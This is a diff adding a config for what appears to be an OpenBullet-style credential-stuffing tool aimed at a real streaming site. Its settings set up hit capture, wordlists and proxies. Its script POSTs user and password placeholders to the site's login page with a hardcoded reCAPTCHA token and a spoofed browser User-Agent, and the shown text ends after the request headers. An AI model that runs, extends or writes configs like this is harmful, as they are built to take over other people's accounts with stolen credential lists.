@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "sandbox.game",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-24T17:36:52.1921741+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "simple",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "sandbox",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://new.plusx.tv/login.php" 
+  CONTENT "field_login=<USER>&field_password=<PASS>&submit_login=&reCaptcha=03AGdBq25PBDUWVob6aa-NaeWB7NrCHcNj3SAy-Nk_kVjNeA3XCDUGUc5lNgz7e46RibTkKZcgRmGwAwtkBhsMNZeIW2rS7lAkV6YABxjq-58YGUDL3Bjmp9d6pyaXeGf-jjI2wg2nnT42Bk9SLwa45HTqtvi1S4uIp7Z02Mq7vRkCpKhX2YdBX_T8oyGKFE3QY0nWiufIkU_7cAL45wAruJrLtfvw0Tx5NNnnS1wVPVL4ClIyGqdiYhweMOcntyi0IyjYE31ZVOF214E9RC7_aKsoSX6q09L38y6xVjjoc6xar4_BqOU27AnGhzCDnYJ6GSfXdBQtuqS8mnluBEO1fS8Ce-oisn_SrPZysOxDujZZCZJFhlAeQgfYtPKxIJvcfgouU_j-LPm21QRlx_NnermdqSYz9ZnsJ0J8gvXK6g9dgf0NFFO_QYE" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
